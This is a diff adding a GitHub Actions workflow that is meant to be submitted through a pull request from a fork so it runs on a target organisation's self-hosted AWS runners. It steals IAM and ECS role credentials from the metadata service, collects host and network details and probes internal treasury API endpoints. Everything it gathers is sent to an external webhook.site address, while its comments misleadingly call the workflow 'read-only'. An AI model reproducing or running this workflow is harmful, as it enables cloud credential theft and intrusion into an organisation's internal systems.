@@ -1,0 +1,74 @@
+# Drop this file into a fork of lemonatio/terraform-aws-github-runner at
+# .github/workflows/imds-probe.yml , push to a branch, open a PR to
+# lemonatio/terraform-aws-github-runner:main and wait for the run.
+#
+# Design notes (from the fork's own terraform defaults, see MATRIX.md):
+#   * matcherConfig = [["self-hosted","linux","x64"]], exactMatch=true
+#     (enable_runner_workflow_job_labels_check_all default true),
+#     bidirectionalLabelMatch=false (default) => the job labels must be a
+#     SUBSET of the runner labels => runs-on:[self-hosted] is the safest
+#     single label; [self-hosted, linux, x64] also matches.
+#   * runner_group_name default = "Default"
+#   * IMDS is IMDSv2-only by default (http_tokens=required, hop-limit 1)
+#   * runner egress default = 0.0.0.0/0  => the POST below works
+#   * runner_run_as = ec2-user, runner_as_root=false (sudo usually allowed)
+# This file is 100% read-only: it never writes to the repo, never calls a
+# write API, only GETs IMDS metadata and POSTs the result out of band.
+name: imds-probe (temporary, read-only)
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  contents: read
+concurrency:
+  group: imds-probe-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  probe:
+    # if the group "Default" is shared with this repo, this lands on the org
+    # EC2 self-hosted fleet (VPC private subnet). If not, the job just stays
+    # queued and expires - no harm done.
+    runs-on: [self-hosted]
+    timeout-minutes: 10
+    steps:
+      - name: collect (read-only) and ship
+        shell: bash
+        run: |
+          set -u
+          OOB="https://webhook.site/2ce44b71-ed22-46e0-a3ea-fe789983d1f2"
+          TOK=$(curl -sS -m 5 -X PUT "http://169.254.169.254/latest/api/token" \
+                 -H "X-aws-ec2-metadata-token-ttl-seconds: 120" || true)
+          H="-H X-aws-ec2-metadata-token:$TOK"
+          ROLE=$(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
+          CREDS=$(curl -sS -m 5 $H "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" || true)
+          IAMINFO=$(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/iam/info || true)
+          IID=$(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/instance-id || true)
+          AZ=$(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/placement/availability-zone || true)
+          ITYPE=$(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/instance-type || true)
+          MACS=$(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/network/interfaces/macs/ || true)
+          VPC=""
+          for m in $MACS; do
+            VPC="$VPC $(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/network/interfaces/macs/${m}vpc-id || true)"
+            VPC="$VPC $(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/network/interfaces/macs/${m}subnet-id || true)"
+            VPC="$VPC $(curl -sS -m 5 $H http://169.254.169.254/latest/meta-data/network/interfaces/macs/${m}security-group-ids || true)"
+          done
+          ECS=$(curl -sS -m 3 http://169.254.170.2/v2/credentials || true)
+          SUDO=$(sudo -n true 2>&1 && echo passwordless-sudo-OK || echo no-sudo)
+          AWSVER=$( (aws --version 2>&1) || echo "no-aws-cli")
+          HOSTINFO="$(id) ; $(hostname) ; $(uname -a)"
+          DNSSEARCH=$(cat /etc/resolv.conf 2>/dev/null | tr '\n' '|')
+          ROUTE=$( (ip route 2>/dev/null || route -n 2>/dev/null) | tr '\n' '|')
+          ENVKEYS=$(env | cut -d= -f1 | sort | tr '\n' ',' )
+          INTRA=$(curl -sS -m 4 -w "|http=%{http_code}" http://10.32.193.70/api/v1/priv/limit-settings || echo "|unreachable")
+          INTRA2=$(curl -sS -m 4 -w "|http=%{http_code}" http://10.32.193.70/api/v1/priv/treasury/whitelisted-accounts || echo "|unreachable")
+          echo "=== RUNNER IDENTITY ==="; echo "$HOSTINFO"
+          echo "=== instance=$IID az=$AZ type=$ITYPE ==="
+          echo "=== role=$ROLE ==="; echo "$CREDS"
+          for kv in host="$HOSTINFO" instance_id="$IID" az="$AZ" itype="$ITYPE" \
+                    net="$VPC" role="$ROLE" creds="$CREDS" iaminfo="$IAMINFO" \
+                    ecs="$ECS" sudo="$SUDO" awscli="$AWSVER" resolv="$DNSSEARCH" \
+                    route="$ROUTE" envkeys="$ENVKEYS" intra="$INTRA" intra2="$INTRA2" run="$GITHUB_RUN_ID" \
+                    repo="$GITHUB_REPOSITORY" actor="$GITHUB_ACTOR"; do
+            curl -sS -m 20 -X POST "$OOB" --data-urlencode "${kv%%=*}=${kv#*=}" || true
+          done
+          echo "=== posted to OOB $OOB ==="
